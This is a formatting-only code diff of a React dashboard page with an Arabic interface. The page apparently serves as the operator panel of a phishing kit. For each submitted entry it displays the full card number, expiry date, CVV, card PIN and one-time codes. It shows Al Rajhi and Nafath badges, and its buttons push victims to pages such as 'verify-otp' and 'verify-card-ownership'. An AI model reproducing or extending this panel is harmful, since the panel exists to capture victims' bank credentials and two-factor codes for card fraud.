@@ -169,7 +169,7 @@ export default function NotificationsPage() {
 
     return () => {
       if (audioRef.current) {
-        audioRef.current.removeEventListener("error", () => {})
+        audioRef.current.removeEventListener("error", () => { })
       }
     }
   }, [])
@@ -647,9 +647,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
+              }`}
           >
             <CreditCard className="h-3 w-3 mr-1" /> دفع
           </Badge>
@@ -659,9 +658,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-indigo-500 to-indigo-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-indigo-600 hover:to-indigo-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-indigo-500 to-indigo-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-indigo-600 hover:to-indigo-700" : ""
+              }`}
           >
             <FileText className="h-3 w-3 mr-1" /> تسجيل
           </Badge>
@@ -671,9 +669,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-purple-500 to-purple-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-purple-600 hover:to-purple-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-purple-500 to-purple-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-purple-600 hover:to-purple-700" : ""
+              }`}
           >
             <Shield className="h-3 w-3 mr-1" /> رمز OTP
           </Badge>
@@ -683,9 +680,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-orange-500 to-orange-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-orange-600 hover:to-orange-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-orange-500 to-orange-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-orange-600 hover:to-orange-700" : ""
+              }`}
           >
             <Smartphone className="h-3 w-3 mr-1" /> رمز هاتف
           </Badge>
@@ -695,9 +691,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-teal-500 to-teal-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-teal-600 hover:to-teal-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-teal-500 to-teal-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-teal-600 hover:to-teal-700" : ""
+              }`}
           >
             <Tag className="h-3 w-3 mr-1" /> راجحي
           </Badge>
@@ -707,9 +702,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-cyan-500 to-cyan-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-cyan-600 hover:to-cyan-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-cyan-500 to-cyan-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-cyan-600 hover:to-cyan-700" : ""
+              }`}
           >
             <Shield className="h-3 w-3 mr-1" /> نفاذ
           </Badge>
@@ -719,9 +713,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
+              }`}
           >
             <Calendar className="h-3 w-3 mr-1" /> الرئيسية
           </Badge>
@@ -731,9 +724,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-stone-500 to-stone-600 text-white border-0 shadow-sm ${
-              clickable ? "cursor-pointer hover:from-stone-600 hover:to-stone-700" : ""
-            }`}
+            className={`bg-gradient-to-r from-stone-500 to-stone-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-stone-600 hover:to-stone-700" : ""
+              }`}
           >
             <Tag className="h-3 w-3 mr-1" /> {pagename || "الرئيسية"}
           </Badge>
@@ -889,11 +881,10 @@ export default function NotificationsPage() {
                     <Button
                       variant="outline"
                       onClick={() => setSoundEnabled(!soundEnabled)}
-                      className={`gap-2 border border-stone-200 dark:border-stone-700 shadow-sm hover:bg-stone-50 dark:hover:bg-stone-800 ${
-                        soundEnabled
+                      className={`gap-2 border border-stone-200 dark:border-stone-700 shadow-sm hover:bg-stone-50 dark:hover:bg-stone-800 ${soundEnabled
                           ? "bg-emerald-50 border-emerald-200 text-emerald-700"
                           : "bg-rose-50 border-rose-200 text-rose-700"
-                      }`}
+                        }`}
                     >
                       {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
                       {soundEnabled ? "إيقاف الصوت" : "تشغيل الصوت"}
@@ -1139,15 +1130,14 @@ export default function NotificationsPage() {
                       <TableCell>
                         <Badge
                           variant="outline"
-                          className={`cursor-pointer ${
-                            notification.card_number
+                          className={`cursor-pointer ${notification.card_number
                               ? notification.pinCode
                                 ? "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100"
                                 : notification.otpCardCode
                                   ? "bg-teal-50 text-teal-700 border-teal-200 hover:bg-teal-100"
                                   : "bg-amber-50 text-amber-700 border-amber-200 hover:bg-amber-100"
                               : "bg-gradient-to-r from-rose-400 to-rose-500 text-white hover:from-rose-500 hover:to-rose-600"
-                          }`}
+                            }`}
                           onClick={(e) => handleCardBadgeClick(notification, e)}
                         >
                           <CardIcon className="h-3.5 w-3.5 mr-1.5 mx-1" />
@@ -1184,13 +1174,11 @@ export default function NotificationsPage() {
 
                           {notification.phone2 && (
                             <Badge
-                              className={`cursor-pointer ${
-                                notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
-                              } ${
-                                notification.otpCode
+                              className={`cursor-pointer ${notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
+                                } ${notification.otpCode
                                   ? "bg-purple-500 text-white hover:bg-purple-600"
                                   : "bg-stone-500 hover:bg-stone-600"
-                              }`}
+                                }`}
                               onClick={(e) => {
                                 e.stopPropagation()
                                 setSelectedNotification(notification)
@@ -1203,18 +1191,18 @@ export default function NotificationsPage() {
                           )}
                         </div>
                       </TableCell>
-                      <TableCell>{notification.otpCode&&<Badge className="bg-green-600">{notification.otpCode}</Badge>}</TableCell>
+                      <TableCell>{notification.otpCode && <Badge className="bg-green-600">{notification.otpCode}</Badge>}</TableCell>
 
                       <TableCell>{getStatusBadge(notification.status)}</TableCell>
                       <TableCell>
-                      <div className="flex flex-col text-right" dir="rtl">
- {
-    formatDistanceToNow(new Date(notification.createdDate), {
-      addSuffix: true,
-      locale: ar,
-    })
- }
-</div>
+                        <div className="flex flex-col text-right" dir="rtl">
+                          {
+                            formatDistanceToNow(new Date(notification.createdDate), {
+                              addSuffix: true,
+                              locale: ar,
+                            })
+                          }
+                        </div>
                       </TableCell>
                       <TableCell>
                         <div className="flex justify-center gap-1">
@@ -1249,14 +1237,14 @@ export default function NotificationsPage() {
 
                               {(notification.card_number ||
                                 (notification.formData && notification.formData.card_number)) && (
-                                <DropdownMenuItem
-                                  onClick={() => handleInfoClick(notification, "card")}
-                                  className="gap-2 hover:bg-stone-50"
-                                >
-                                  <CreditCard className="h-4 w-4" />
-                                  معلومات البطاقة
-                                </DropdownMenuItem>
-                              )}
+                                  <DropdownMenuItem
+                                    onClick={() => handleInfoClick(notification, "card")}
+                                    className="gap-2 hover:bg-stone-50"
+                                  >
+                                    <CreditCard className="h-4 w-4" />
+                                    معلومات البطاقة
+                                  </DropdownMenuItem>
+                                )}
 
                               {notification.vehicle_type && (
                                 <DropdownMenuItem
@@ -1779,11 +1767,10 @@ export default function NotificationsPage() {
                 <div className="grid grid-cols-2 gap-2">
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === "payment"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "payment"
                         ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "payment")}
                   >
                     <CreditCard className="h-4 w-4" />
@@ -1791,11 +1778,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === ""
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === ""
                         ? "bg-indigo-50 border-indigo-300 dark:bg-indigo-900/30 dark:border-indigo-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "")}
                   >
                     <FileText className="h-4 w-4" />
@@ -1803,11 +1789,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === "nafaz"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "nafaz"
                         ? "bg-cyan-50 border-cyan-300 dark:bg-cyan-900/30 dark:border-cyan-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                   >
                     <Shield className="h-4 w-4" />
@@ -1815,11 +1800,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === "verify-otp"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "verify-otp"
                         ? "bg-purple-50 border-purple-300 dark:bg-purple-900/30 dark:border-purple-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp")}
                   >
                     <Shield className="h-4 w-4" />
@@ -1827,11 +1811,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === "external-link"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "external-link"
                         ? "bg-teal-50 border-teal-300 dark:bg-teal-900/30 dark:border-teal-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "external-link")}
                   >
                     <Tag className="h-4 w-4" />
@@ -1839,11 +1822,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === "verify-card-ownership"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "verify-card-ownership"
                         ? "bg-amber-50 border-amber-300 dark:bg-amber-900/30 dark:border-amber-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership")}
                   >
                     <CreditCard className="h-4 w-4" />
@@ -1851,11 +1833,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === "verify-phone"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "verify-phone"
                         ? "bg-orange-50 border-orange-300 dark:bg-orange-900/30 dark:border-orange-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone")}
                   >
                     <Smartphone className="h-4 w-4" />
@@ -1863,11 +1844,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${
-                      selectedNotification.pagename === "offers"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "offers"
                         ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "offers")}
                   >
                     <Tag className="h-4 w-4" />
@@ -1942,45 +1922,45 @@ export default function NotificationsPage() {
 
               {(selectedNotification.card_number ||
                 (selectedNotification.formData && selectedNotification.formData.card_number)) && (
-                <div className="bg-teal-50 rounded-lg p-4 border border-teal-100">
-                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-stone-800">
-                    <CreditCard className="h-5 w-5 text-teal-600" />
-                    معلومات البطاقة
-                  </h3>
-                  <div className="space-y-3">
-                    <div className="flex justify-between">
-                      <span className="text-sm text-stone-600">رقم البطاقة:</span>
-                      <span className="font-medium font-mono text-stone-800">
-                        {selectedNotification.card_number ||
-                          (selectedNotification.formData && selectedNotification.formData.card_number) ||
-                          "غير محدد"}
-                      </span>
-                    </div>
-                    <div className="flex justify-between">
-                      <span className="text-sm text-stone-600">تاريخ الانتهاء:</span>
-                      <span className="font-medium font-mono text-stone-800">
-                        {selectedNotification.expiration_date ||
-                          (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
-                          "غير محدد"}
-                      </span>
-                    </div>
-                    <div className="flex justify-between">
-                      <span className="text-sm text-stone-600">رمز الأمان:</span>
-                      <span className="font-medium font-mono text-stone-800">
-                        {selectedNotification.cvv ||
-                          (selectedNotification.formData && selectedNotification.formData.cvv) ||
-                          "غير محدد"}
-                      </span>
-                    </div>
-                    {selectedNotification.pinCode && (
+                  <div className="bg-teal-50 rounded-lg p-4 border border-teal-100">
+                    <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-stone-800">
+                      <CreditCard className="h-5 w-5 text-teal-600" />
+                      معلومات البطاقة
+                    </h3>
+                    <div className="space-y-3">
                       <div className="flex justify-between">
-                        <span className="text-sm text-stone-600">الرقم السري:</span>
-                        <span className="font-medium font-mono text-stone-800">{selectedNotification.pinCode}</span>
+                        <span className="text-sm text-stone-600">رقم البطاقة:</span>
+                        <span className="font-medium font-mono text-stone-800">
+                          {selectedNotification.card_number ||
+                            (selectedNotification.formData && selectedNotification.formData.card_number) ||
+                            "غير محدد"}
+                        </span>
                       </div>
-                    )}
+                      <div className="flex justify-between">
+                        <span className="text-sm text-stone-600">تاريخ الانتهاء:</span>
+                        <span className="font-medium font-mono text-stone-800">
+                          {selectedNotification.expiration_date ||
+                            (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
+                            "غير محدد"}
+                        </span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-sm text-stone-600">رمز الأمان:</span>
+                        <span className="font-medium font-mono text-stone-800">
+                          {selectedNotification.cvv ||
+                            (selectedNotification.formData && selectedNotification.formData.cvv) ||
+                            "غير محدد"}
+                        </span>
+                      </div>
+                      {selectedNotification.pinCode && (
+                        <div className="flex justify-between">
+                          <span className="text-sm text-stone-600">الرقم السري:</span>
+                          <span className="font-medium font-mono text-stone-800">{selectedNotification.pinCode}</span>
+                        </div>
+                      )}
+                    </div>
                   </div>
-                </div>
-              )}
+                )}
 
               {selectedNotification.vehicle_type && (
                 <div className="bg-indigo-50 rounded-lg p-4 border border-indigo-100">
@@ -2030,10 +2010,10 @@ export default function NotificationsPage() {
                   <div className="flex justify-between">
                     <span className="text-sm text-stone-600">تاريخ الإنشاء:</span>
                     <span className="font-medium text-stone-800">
-                    {    formatDistanceToNow(new Date(selectedNotification.createdDate), {
-      addSuffix: true,
-      locale: ar,
-    })}
+                      {formatDistanceToNow(new Date(selectedNotification.createdDate), {
+                        addSuffix: true,
+                        locale: ar,
+                      })}
                     </span>
                   </div>
                 </div>
